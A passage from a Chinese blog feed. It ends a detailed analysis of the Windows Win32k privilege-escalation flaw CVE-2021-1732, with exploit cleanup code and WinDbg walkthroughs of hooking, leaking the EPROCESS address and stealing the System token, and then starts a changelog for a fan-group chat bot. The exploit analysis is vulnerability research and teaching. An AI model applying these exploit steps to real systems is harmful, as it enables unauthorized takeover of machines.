class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">g_dwpWndKernel_heap_offset2 = *(ULONG_PTR*)((PBYTE)pWnd2 + g_dwKernel_pWnd_offset);<span class="comment">// tagWNDk2 相对于桌面堆基址的偏移</span></span><br><span class="line">ULONG_PTR dwpWnd0_to_pWnd2_kernel_heap_offset = *(ULONGLONG*)((PBYTE)g_pWnd[<span class="number">0</span>] + <span class="number">0x128</span>);<span class="comment">// tagWNDk0 在桌面堆上的扩展内存相对于桌面堆基址的偏移</span></span><br><span class="line"><span class="keyword">if</span> (dwpWnd0_to_pWnd2_kernel_heap_offset &lt; g_dwpWndKernel_heap_offset2) &#123;<span class="comment">// tagWNDk2 需在二者中较高的地址</span></span><br><span class="line">    dwpWnd0_to_pWnd2_kernel_heap_offset = (g_dwpWndKernel_heap_offset2 - dwpWnd0_to_pWnd2_kernel_heap_offset);<span class="comment">// 计算二者的偏移</span></span><br><span class="line">    <span class="comment">// 去掉 ptagWNDk2-&gt;dwExtraFlag 的 0x800 属性，pExtraBytes 改回直接寻址模式</span></span><br><span class="line">    DWORD dwFlag = *(ULONGLONG*)((PBYTE)pWnd2 + g_dwModifyOffsetFlag_offset);</span><br><span class="line">    dwFlag &amp;= ~<span class="number">0x800</span>;</span><br><span class="line">    <span class="built_in">SetWindowLongPtr</span>(g_hWnd[<span class="number">0</span>], dwpWnd0_to_pWnd2_kernel_heap_offset + g_dwModifyOffsetFlag_offset, dwFlag);</span><br><span class="line">    <span class="comment">// 在用户空间堆中申请一片空间来赋值 ptagWNDk2-&gt;pExtraBytes</span></span><br><span class="line">    PVOID pAlloc = <span class="built_in">g_fRtlAllocateHeap</span>((PVOID) * (ULONG_PTR*)(__readgsqword(<span class="number">0x60</span>) + <span class="number">0x30</span>), <span class="number">0</span>, g_dwMyWndExtra);</span><br><span class="line">    <span class="built_in">SetWindowLongPtr</span>(g_hWnd[<span class="number">0</span>], dwpWnd0_to_pWnd2_kernel_heap_offset + g_dwModifyOffset_offset, (LONG_PTR)pAlloc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 还原 ptagWNDk1-&gt;spMenu 时，ptagWNDk1-&gt;dwStyle 需要带有 WS_CHILD 属性</span></span><br><span class="line">    ULONGLONG ululStyle = *(ULONGLONG*)((PBYTE)g_pWnd[<span class="number">1</span>] + g_dwExStyle_offset);</span><br><span class="line">    ululStyle |= <span class="number">0x4000000000000000</span>L;</span><br><span class="line">    <span class="built_in">SetWindowLongPtr</span>(g_hWnd[<span class="number">0</span>], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwExStyle_offset, ululStyle);<span class="comment">// 为窗口 1 添加 WS_CHILD 样式</span></span><br><span class="line">    <span class="comment">// 使用 SetWindowLongPtr 自带功能（-12）还原 ptagWNDk1-&gt;spMenu</span></span><br><span class="line">    ULONG_PTR pMyMenu = <span class="built_in">SetWindowLongPtr</span>(g_hWnd[<span class="number">1</span>], GWLP_ID, (LONG_PTR)pSPMenu);</span><br><span class="line">    <span class="comment">// 这里应该释放伪造 tagMENU 时申请的那些空间，因为没有后续利用，写不写倒是无所谓</span></span><br><span class="line">    <span class="comment">// 移除窗口 1 的 WS_CHILD 样式</span></span><br><span class="line">    ululStyle &amp;= ~<span class="number">0x4000000000000000</span>L;</span><br><span class="line">    <span class="built_in">SetWindowLongPtr</span>(g_hWnd[<span class="number">0</span>], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwExStyle_offset, ululStyle);</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Recovery bug prevent blue screen.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>376 - 388 行释放剩余的资源，EXP 至此结束：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">DestroyWindow</span>(g_hWnd[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">DestroyWindow</span>(g_hWnd[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">DestroyWindow</span>(hWnd2);</span><br><span class="line"><span class="comment">// 232、233 行创建的两个菜单还没有释放！</span></span><br><span class="line"><span class="keyword">if</span> (pSystemEProcess != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;CVE-2021-1732 Exploit success, system permission&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;CVE-2021-1732 Exploit fail&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">int</span>)<span class="number">0</span>;</span><br></pre></td></tr></table></figure><br><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><h3 id="双机调试环境搭建-20"><a href="#双机调试环境搭建-20" class="headerlink" title="双机调试环境搭建[20]"></a>双机调试环境搭建<sup>[20]</sup></h3><p>确保你有一个 Win10 1809 的虚拟机，如果没有，可以参考 <strong>2.1 节</strong>。</p><p>接着从 github 下载最新版 VirtualKD-Redux<sup>[21]</sup>：</p><p><img src="/img/article/20220104/debugging/two_machine_debug/1.png" alt="1"></p><p>解压后将 <strong>target64 文件夹</strong>复制到虚拟机内，在虚拟机里以管理员身份运行文件夹中的 <strong>vminstall.exe</strong>，点击 Install 按钮：</p><p><img src="/img/article/20220104/debugging/two_machine_debug/2.png" alt="2"></p><p>弹出的警告无视掉，然后重启虚拟机（选<strong>是</strong>会自动重启）。启动界面会让你选择启动项，选到我们新加的启动项<strong>按下 F8</strong>，选择<strong>禁用驱动程序强制签名</strong>并按下回车：</p><p><img src="/img/article/20220104/debugging/two_machine_debug/3.png" alt="3"></p><p>等待进入桌面后（<strong>建议重新拍摄一个快照</strong>），在<strong>宿主机</strong>中运行 VirtualKD-Redux 文件夹下的 <strong>vmmon64.exe</strong>，设置 WinDbg 调试器的路径（如果没有安装 WinDbg，可以参考微软官方文档<sup>[22]</sup>）：</p><p><img src="/img/article/20220104/debugging/two_machine_debug/4.png" alt="4"></p><p>点击 Run debugger 就会弹出 WinDbg（以后再调试都会自动弹出），按 WinDbg 上方的暂停按键就可以断下来了：</p><p><img src="/img/article/20220104/debugging/two_machine_debug/5.png" alt="5"></p><p>下方命令行输入 g，虚拟机就可以继续运行了，<strong>后面再想中断，可以按 WinDbg 上方的暂停按键</strong>。</p><p>最后是设置 WinDbg 使用的符号路径<sup>[23]</sup>，需要添加一个 _NT_SYMBOL_PATH 系统环境变量，值为 <code>srv*path</code></p><p><code>to\your\local\folder*https://msdl.microsoft.com/download/symbols</code>，两个星号中间部分替换为你的本地文件夹（WinDbg 将自动从微软符号服务器下载 pdb 文件到这个文件夹中）：</p><p><img src="/img/article/20220104/debugging/two_machine_debug/6.png" alt="6"></p><p><strong>重启 WinDbg 后生效</strong>。</p><br><h3 id="IDA-加载-pdb-文件"><a href="#IDA-加载-pdb-文件" class="headerlink" title="IDA 加载 pdb 文件"></a>IDA 加载 pdb 文件</h3><p>以 ExploitTest.exe 为例，使用 IDA 加载  ExploitTest.exe 后，选择上方的 File -&gt; Load file -&gt; PDB file，选择 pdb 路径：</p><p><img src="/img/article/20220104/debugging/ida_load_pdb/1.png" alt="1"></p><p>加载完毕后，左侧函数窗口就能看到符号了：</p><p><img src="/img/article/20220104/debugging/ida_load_pdb/2.png" alt="2"></p><br><h3 id="调试某一进程"><a href="#调试某一进程" class="headerlink" title="调试某一进程"></a>调试某一进程</h3><p>以 ExploitTest.exe 为例，在虚拟机中运行 ExploitTest.exe ，WinDbg 中按下暂停后首先找到进程的 EPROCESS 地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !process 0 0 ExploitTest.exe</span><br><span class="line">PROCESS ffffc90f5867c080</span><br><span class="line">    SessionId: 1  Cid: 08c0    Peb: 00298000  ParentCid: 0eb8</span><br><span class="line">    DirBase: 62300002  ObjectTable: ffffdd89449bd940  HandleCount:  56.</span><br><span class="line">    Image: ExploitTest.exe</span><br></pre></td></tr></table></figure><p>使用 .process 指令与找到的 EPROCESS 地址切换到该进程的地址空间：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; .process /i /p ffffc90f5867c080</span><br><span class="line">You need to continue execution (press &#x27;g&#x27; &lt;enter&gt;) for the context</span><br><span class="line">to be switched. When the debugger breaks in again, you will be in</span><br><span class="line">the new process context.</span><br></pre></td></tr></table></figure><p>然后 g 运行一下，WinDbg 会切换进程并断在 ExploitTest.exe 进程中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; g</span><br><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line">nt!DbgBreakPointWithStatus:</span><br><span class="line">fffff801`10dc7cc0 cc              int     3</span><br></pre></td></tr></table></figure><p>最后重新加载符号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !sym noisy</span><br><span class="line">noisy mode - symbol prompts on</span><br><span class="line"></span><br><span class="line">kd&gt; .reload /f</span><br><span class="line">Loading User Symbols</span><br><span class="line">... 等待其从微软符号服务器下载符号</span><br></pre></td></tr></table></figure><p>可以看到加载了的模块都有对应的 pdb 了：</p><p><img src="/img/article/20220104/debugging/debug_process/1.png" alt="1"></p><p>现在就可以：</p><ol><li>根据 IDA 上看到的地址来下断点（之前编译的时候已经关闭了随机基址，参考 <strong>2.2 节</strong>）</li><li>加载源码进行调试</li></ol><p>对于第二种调试方法，选择 WinDbg 上方 File -&gt; Open Source File，加载 CVE-2021-1732_Exploit.cpp，即可在源码窗口下断点：</p><p><img src="/img/article/20220104/debugging/debug_process/2.png" alt="2"></p><br><h3 id="获取-pdb-文件"><a href="#获取-pdb-文件" class="headerlink" title="获取 pdb 文件"></a>获取 pdb 文件</h3><p>对于调试过程中被调试进程已经加载了的模块，可以通过 <code>.reload /f</code> 指令来下载（上一部分已提及）。想要获得未加载模块的 pdb 文件，可以先在虚拟机中找到该模块，将其复制到宿主机中，再通过 WinDbg 同级目录下的 symchk.exe 来下载。</p><p>以 win32kfull.sys 为例，该驱动位于 C:\Windows\System32 目录下：</p><p><img src="/img/article/20220104/debugging/get_pdb_file/1.png" alt="1"></p><p>拷贝到宿主机后，找到 WinDbg 所在目录，使用 symchk 并指定 win32kfull.sys 路径：</p><p><img src="/img/article/20220104/debugging/get_pdb_file/2.png" alt="2"></p><p>之后就能在符号缓存目录下找到 pdb 了：</p><p><img src="/img/article/20220104/debugging/get_pdb_file/3.png" alt="3"></p><br><h3 id="exp-关键点动态调试"><a href="#exp-关键点动态调试" class="headerlink" title="exp 关键点动态调试"></a>exp 关键点动态调试</h3><blockquote><p>挂钩 user32!_xxxClientAllocWindowClassExtraBytes</p></blockquote><p>202 行下断点，运行到此处，先查看原 KernelCallbackTable[123] 表项，其指向 user32!_xxxClientAllocWindowClassExtraBytes：</p><p><img src="/img/article/20220104/debugging/exp_debug/1.png" alt="1"></p><p>步过后，该项被改为我们的挂钩函数：<br><img src="/img/article/20220104/debugging/exp_debug/2.png" alt="2"></p><br><blockquote><p>内存布局情况</p></blockquote><p>运行到 286 行，在 <code>win32kfull!xxxCreateWindowEx+1182</code> 下个断点，r15 为 tagWND2 的地址（IDA 查看函数偏移可以在 Options -&gt; General 中勾选 Function offsets）：</p><p><img src="/img/article/20220104/debugging/exp_debug/3.png" alt="3"></p><p><img src="/img/article/20220104/debugging/exp_debug/4.png" alt="4"></p><p>访问 <code>*(*(&amp;tagWND + 0x18) + 0x80)</code> 得到桌面堆基址 0xffff892a81000000：</p><p><img src="/img/article/20220104/debugging/exp_debug/5.png" alt="5"></p><p>通过 EXP 的 g_pwnd 数组 0、1 两项可以获取到 tagWNDk0、tagWNDk1 相对于桌面堆的偏移：</p><p><img src="/img/article/20220104/debugging/exp_debug/6.png" alt="6"></p><p>故 tagWNDk0 地址为 0xffff892a81030bc0，tagWNDk1 地址为 0xffff892a81033b10，tagWNDk2 地址为 0xffff892a81033c60。继续运行到执行流返回 EXP 的 287 行，现在窗口 0 和窗口 2 的 pExtraBytes 均处于 offset 间接寻址模式，来看看他们的扩展内存在哪里：</p><p><img src="/img/article/20220104/debugging/exp_debug/7.png" alt="7"></p><p>可以看到，窗口 0 的扩展内存处于较低的地址，窗口 2 的扩展内存语义上指向了 tagWNDk0 ，这样的内存布局正符合我们的期望：</p><p><img src="/img/article/20220104/debugging/exp_debug/8.png" alt="8"></p><br><blockquote><p>泄露 EPROCESS 地址</p></blockquote><p>运行到 293 行，在 <code>win32kfull!xxxSetWindowLongPtr</code> 下断点，第一个参数为 tagWND0 的地址，保存在 rcx 寄存器：</p><p><img src="/img/article/20220104/debugging/exp_debug/9.png" alt="9"></p><p>运行到 306 行，同样在 <code>win32kfull!xxxSetWindowLongPtr</code> 下断点，第一个参数为 tagWND1 的地址，同样保存在 rcx 寄存器：</p><p><img src="/img/article/20220104/debugging/exp_debug/10.png" alt="10"></p><p>tagWND1 原来的 spMenu：</p><p><img src="/img/article/20220104/debugging/exp_debug/11.png" alt="11"></p><p>继续执行直到执行流返回 309 行，tagWND1.spMenu 就被修改为指向我们伪造的 tagMENU 结构体了：</p><p><img src="/img/article/20220104/debugging/exp_debug/12.png" alt="12"></p><p>接着 EXP 会通过三次 GetMenuBarInfo 来泄露进程 EPROCES 地址，让程序运行到读取完毕的 320 行，验证地址的正确性：</p><p><img src="/img/article/20220104/debugging/exp_debug/13.png" alt="13"></p><br><blockquote><p>权限提升</p></blockquote><p>让程序执行到 339 行，验证找到的 System 进程 EPROCESS 地址：</p><p><img src="/img/article/20220104/debugging/exp_debug/14.png" alt="14"></p><p>可以得知 System Token 为 <strong>0xffff9209cb20604a</strong>，且此时 tagWNDk1.pExtraBytes 处于直接寻址模式：</p><p><img src="/img/article/20220104/debugging/exp_debug/15.png" alt="15"></p><p>当前进程原来的 Token 为 0xffff9209d2acc067：</p><p><img src="/img/article/20220104/debugging/exp_debug/16.png" alt="16"></p><p>执行到 350 行（使用任意地址写能力修改当前进程 Token 结束后），再查看当前进程的 Token：</p><p><img src="/img/article/20220104/debugging/exp_debug/17.png" alt="17"></p><p>成功更换令牌，实现提权。</p><br><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>由于官网<sup>[24]</sup>上的补丁包我打不上，索性就用已经打满补丁的（4 月的包也更新了）Windows10 20H2 x64 宿主机来看吧，补丁打在了 win32kfull!xxxCreateWindowEx：</p><p><img src="/img/article/20220104/patch_analyze/1.png" alt="1"></p><br><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>完结撒花，感谢你耐心的阅读！如果前面的每个部分都细看了，那么相信现在你已经对 CVE 2021-1732 了若指掌了，恭喜你！同时也特别感谢 Kernel Killer 的 EXP 开发文档<sup>[5]</sup> 和 iamelli0t 的漏洞分析博客<sup>[12]</sup>，这两篇文章数次拯救我于水深火热（大脑短路）之中。除此之外，我还推荐一篇奇安信威胁情报中心发的文章<sup>[10]</sup>，其作者详细分析了在野攻击样本，满篇的动态调试弥补了本文动调方面的不足。</p><p>其实一开始我还想拿一个版块来写 KaLendsi<sup>[4]</sup> 的 EXP 分析，奈何本人精力有限，这篇不到 16000 字的 CVE 分析已经耗费了我大量的心血，虽然这可能与我第一次做 Windows 内核漏洞利用的分析有关（笑）。从有写这篇文章的想法，到拙作收笔，期间的时空跨度很大，时间上，各种参考文献的查找、阅读就花掉了半个月，剩下半个月一半时间在静态分析各个模块和调试 EXP，另一半用来没日没夜地写作；空间上，随着宛如甘霖的 5.1 假期到来，我从呆了一年的学校回到了心心念念的家中……总之，如果你阅读了 KaLendsi 的 EXP，劳烦你告知我他的做法，谢谢！而如果你有心去阅读 KaLendsi 的 EXP，本文已经给你提供了足够的能力，也希望你读懂后能与我交流 ~</p><p>最后我想说，即使校对了 3 遍，我还是不能打包票 —— 本文不存在笔误，毕竟我在各参考文献中就发现了不少的错误，这一点望读者海涵。如果我哪里写错而误导了你，请务必告知我，届时求轻喷 555</p><br><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1732">MSRC: Windows Win32k 特权提升漏洞公告</a></p><p>[2] <a href="https://ti.dbappsecurity.com.cn/blog/index.php/2021/02/10/windows-kernel-zero-day-exploit-is-used-by-bitter-apt-in-targeted-attack-cn/">0Day攻击！首次发现蔓灵花组织在针对国内的攻击活动中使用Windows内核提权0Day漏洞（CVE-2021-1732）</a></p><p>[3] <a href="https://github.com/k-k-k-k-k/CVE-2021-1732">Github: k-k-k-k-k/CVE-2021-1732</a></p><p>[4] <a href="https://github.com/KaLendsi/CVE-2021-1732-Exploit">Github: KaLendsi/CVE-2021-1732-Exploit</a></p><p>[5] <a href="https://bbs.pediy.com/thread-266362.htm">[原创]CVE-­2021­-1732 Microsoft Windows10 本地提权漏洞研究及Exploit开发</a></p><p>[6] <a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winuser/ns-winuser-wndclassexa?f1url=%3FappId%3DDev16IDEF1%26l%3DZH-CN%26k%3Dk(WINUSER%252FWNDCLASSEXA);k(WNDCLASSEXA);k(DevLang-C%252B%252B);k(TargetOS-Windows)%26rd%3Dtrue">WNDCLASSEXA structure (winuser.h)</a></p><p>[7] <a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-createwindowexw">CreateWindowExW function (winuser.h)</a></p><p>[8] <a href="https://www.programmersought.com/article/89797235329/">Win10 tagWnd partial member reverse (window hidden, window protected)</a></p><p>[9] <a href="https://www.fuzzysecurity.com/tutorials/expDev/22.html">Part 18: Kernel Exploitation -&gt; RS2 Bitmap Necromancy</a></p><p>[10] <a href="https://www.secrss.com/articles/29758">Microsoft Windows提权漏洞 (CVE-2021-1732) 分析</a></p><p>[11] <a href="https://bbs.pediy.com/thread-104918.htm">[原创]KeUserModeCallback用法详解</a></p><p>[12] <a href="https://iamelli0t.github.io/2021/03/25/CVE-2021-1732.html">CVE-2021-1732: win32kfull xxxCreateWindowEx callback out-of-bounds</a></p><p>[13] <a href="https://blog.csdn.net/iiprogram/article/details/1494927">Windows源代码阅读之 句柄算法</a></p><p>[14] <a href="https://theevilbit.github.io/posts/a_simple_protection_against_hmvalidatehandle_technique/">A simple protection against HMValidateHandle technique</a></p><p>[15] <a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-getmenubarinfo?f1url=%3FappId%3DDev16IDEF1%26l%3DZH-CN%26k%3Dk(WINUSER%252FGetMenuBarInfo);k(GetMenuBarInfo);k(DevLang-C%252B%252B);k(TargetOS-Windows)%26rd%3Dtrue">GetMenuBarInfo function (winuser.h)</a></p><p>[16] <a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winuser/ns-winuser-menubarinfo?f1url=%3FappId%3DDev16IDEF1%26l%3DZH-CN%26k%3Dk(WINUSER%252FPMENUBARINFO);k(PMENUBARINFO);k(DevLang-C%252B%252B);k(TargetOS-Windows)%26rd%3Dtrue">MENUBARINFO structure (winuser.h)</a></p><p>[17] <a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-setwindowlongptrw">SetWindowLongPtrW function (winuser.h)</a></p><p>[18] <a href="https://blog.csdn.net/pureman_mega/article/details/78907058">通过ActiveProcessLinks遍历进程</a></p><p>[19] <a href="https://blog.csdn.net/qq_32619837/article/details/90711736">使用AllocConsole在Win32程序中调用控制台调试输出</a></p><p>[20] <a href="https://zhuanlan.zhihu.com/p/114538001">使用VMware + win10 + VirtualKD + windbg从零搭建双机内核调试环境</a></p><p>[21] <a href="https://github.com/4d61726b/VirtualKD-Redux/releases">Github: VirtualKD-Redux/release</a></p><p>[22] <a href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/debugger/debugger-download-tools">下载 Windows 调试工具</a></p><p>[23] <a href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/debugger/using-a-symbol-server">使用符号服务器</a></p><p>[24] <a href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB4601345">Microsoft Update Catalog</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> 本地提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Koi Bot项目开发记录</title>
      <link href="/2021/09/23/Koi-Bot%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/09/23/Koi-Bot%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一个用爱发电的项目，为 <a href="https://space.bilibili.com/210127180">koi欢</a> 定制的粉丝群 bot，项目地址为 <a href="https://github.com/in1nit1t/Koi-Bot">Koi-Bot</a>，<strong>简介与配置方法都在 README 中</strong></p><p>欢迎大佬们来 671734248（qq群）单推 koi ，如果有兴趣贡献代码让 kb 变得更强大♂的话，就再好不过啦~</p><br><h2 id="2021-09-23-v0-1-0"><a href="#2021-09-23-v0-1-0" class="headerlink" title="2021.09.23 / v0.1.0"></a>2021.09.23 / v0.1.0</h2><p>初代版本开发完成，具有 14 个主动技能、10 个被动技能</p><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>主动技能</span></div>    <div class="hide-content"><ol><li>菜单<ul><li>所有功能概述</li><li>每种功能的详细解释（指令格式及效果等）</li></ul></li><li>签到<ul><li>完成今日签到，获得积分</li><li>查询历史签到情况</li></ul></li><li>积分兑换<ul><li>列出可兑换物品（普通及限时物品）</li><li>用户兑换指定物品后，通过私聊发送</li></ul></li><li>好康的图（咳咳）<ul><li>返回图片的同时携带标题、pid、画师信息</li><li>支持 tag 搜索</li><li>支持获取原画画质的图片</li></ul></li><li>梗百科<ul><li>支持通过关键词查找梗出处</li><li>列出满足条件的所有条目</li><li>可以展开任意条目获取详细信息</li></ul></li><li>群语音操作<ul><li>保存语音</li><li>播放历史语音</li><li>添加语音标签</li><li>查看语音标签</li><li>修改语音标签</li><li>通过标签搜索语音</li><li>删除已保存语音</li></ul></li><li>摆烂模式</li><li>网易云点歌</li><li>多语种互译</li><li>毒鸡汤</li><li>土味情话</li><li>舔狗日记</li><li>查询拼音缩写的含义</li><li>生成器<ul><li>生成绝绝子</li><li>生成记仇表情包</li></ul></li></ol></div></div><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>被动技能</span></div>    <div class="hide-content"><p>被动技能</p><ol><li>发言数日榜/周榜</li><li>每日早安推送<ul><li>随机 ACG 图片一张</li><li>历史上的今天</li><li>今日早报</li></ul></li><li>koi 发送早晚安时回应（发病）</li><li>复读</li><li>特殊字符/句型反应（好好好/捏/是吧/草）</li><li>戳一戳，回应以下之一<ul><li>戳回去</li><li>钉宫语音</li><li>回应一句话</li><li>随机 ACG 图片一张</li><li>戳的次数多了，禁言 1 分钟</li></ul></li><li>自动通过好友申请，并发送打招呼消息</li><li>群新成员欢迎</li><li>被艾特后回应</li><li>b 站通知<ul><li>新动态（携带动态截图）</li><li>新作品（携带作品截图）</li><li>新粉丝（携带新粉丝头像及id）</li></ul></li></ol></div></div><p>经历：为了解耦，重构了两次代码结构，引入了一堆 bug</p><p>感受：业务逻辑一行，异常处理三行</p><br><h2 id="2021-09-24-v0-1-2"><a href="#2021-09-24-v0-1-2" class="headerlink" title="2021.09.24 / v0.1.2"></a>2021.09.24 / v0.1.2</h2><ul><li>修改了 bot 的日志文件名格式</li><li>修改了 README 中关于 go-cqhttp 日志管理的描述，<strong>WARNING</strong> 以上的日志等级都会被记录在 logs 目录，不用再重定向到单独的文件</li><li>修复了用户初次签到后，最大连续签到天数为 0 的 bug</li></ul><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>go-cqhttp 日志管理原始描述</span></div>    <div class="hide-content"><p>上个版块第 3 点命令中的 <code>2&gt;cqlog</code> 会将标准错误流重定向到 cqlog 文件，这样查看 cqlog 文件就能获得 go-cqhttp 程序的日志输出</p><p>不过这个文件大小会随着时间推进越来越大，这里推荐使用 <strong>logrotate</strong> 来自动地分割日志和丢弃旧日志，参考文章 <a href="https://www.cnblogs.com/clsn/p/8428257.html">日志切割之Logrotate</a>，下面贴出我的配置文件（/etc/logrotate.d/cqlog）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/home/in1t/koibot/cqlog &#123;</span><br><span class="line">    daily</span><br><span class="line">    dateext</span><br><span class="line">    rotate 5</span><br><span class="line">    missingok</span><br><span class="line">    create 644 in1t in1t</span><br><span class="line">    postrotate</span><br><span class="line">        /usr/bin/killall -HUP rsyslogd</span><br><span class="line">    endscript</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div><br><h2 id="2021-09-25-v0-2-0"><a href="#2021-09-25-v0-2-0" class="headerlink" title="2021.09.25 / v0.2.0"></a>2021.09.25 / v0.2.0</h2><ul><li>增加了 <strong>cosplay 图片</strong> 模块，好文明！</li><li>修了一些小 bug</li></ul><br><h2 id="2021-09-29-v0-2-1"><a href="#2021-09-29-v0-2-1" class="headerlink" title="2021.09.29 / v0.2.1"></a>2021.09.29 / v0.2.1</h2><ul><li>修复因 <code>page crash</code> 导致的 bilibilib 动态截图失败现象</li><li>优化 <code>README.md</code> 的描述</li><li>修复获取语音时会 @ 两次的 bug</li></ul><br><h2 id="2021-10-2-v0-3-0"><a href="#2021-10-2-v0-3-0" class="headerlink" title="2021.10.2 / v0.3.0"></a>2021.10.2 / v0.3.0</h2><ul><li>增加 <code>通知</code> 的<strong>私聊</strong>指令，群聊管理员可以使用该指令让 bot 转述自己的话至群聊</li><li>bilibili 新作品会 @ 全体</li></ul><br><h2 id="2021-10-3-v0-3-1"><a href="#2021-10-3-v0-3-1" class="headerlink" title="2021.10.3 / v0.3.1"></a>2021.10.3 / v0.3.1</h2><ul><li>将 <code>通知</code> 指令更名为 <code>转述</code></li><li>支持 bilibili 小程序转发，转发 bilibili 视频给 bot，bot 会将其转发到群聊</li><li>修正项目描述中的 <code>setting.json</code> 样例</li><li>支持监听多位 bilibili 用户的动态</li></ul><br><h2 id="2021-10-6-v0-3-2"><a href="#2021-10-6-v0-3-2" class="headerlink" title="2021.10.6 / v0.3.2"></a>2021.10.6 / v0.3.2</h2><ul><li>优化 <code>main.py</code>、<code>cosplay</code> 模块、<code>bilibili</code> 模块、<code>periodic.py</code></li><li>修复 <code>bilibili</code> 模块中发布新作品时 <code>json.loads</code> 存在的 bug</li></ul><br><h2 id="2021-10-22-v0-4-0"><a href="#2021-10-22-v0-4-0" class="headerlink" title="2021.10.22 / v0.4.0"></a>2021.10.22 / v0.4.0</h2><ul><li>增加 <code>疫情</code> 模块（群聊），可以查询国内省市的疫情数据</li><li>增加 <code>语音列表</code> <strong>私聊</strong>指令，可以获取数据库中保存的所有语音详情</li></ul><br><h2 id="2021-10-27-v0-4-1"><a href="#2021-10-27-v0-4-1" class="headerlink" title="2021.10.27 / v0.4.1"></a>2021.10.27 / v0.4.1</h2><ul><li>由于网站的更新，重写了爬虫，修复了 <code>梗百科</code> 模块</li></ul><br><h2 id="2021-12-12-v0-4-2"><a href="#2021-12-12-v0-4-2" class="headerlink" title="2021.12.12 / v0.4.2"></a>2021.12.12 / v0.4.2</h2><ul><li>更新 <code>README.md</code> 的描述</li><li>由于 go-cqhttp 的更新，<code>get_msg</code> API 无法获取到 <code>raw_message</code> 字段，语音模块受到影响，因此更改了语音模块的保存策略</li></ul><br><h2 id="2021-12-27-v0-5-0"><a href="#2021-12-27-v0-5-0" class="headerlink" title="2021.12.27 / v0.5.0"></a>2021.12.27 / v0.5.0</h2><ul><li>增加 <code>投稿</code> 功能，群员可以通过群聊或私聊进行投稿，每周日会展示本周所有的投稿消息，也可以在私聊中通过 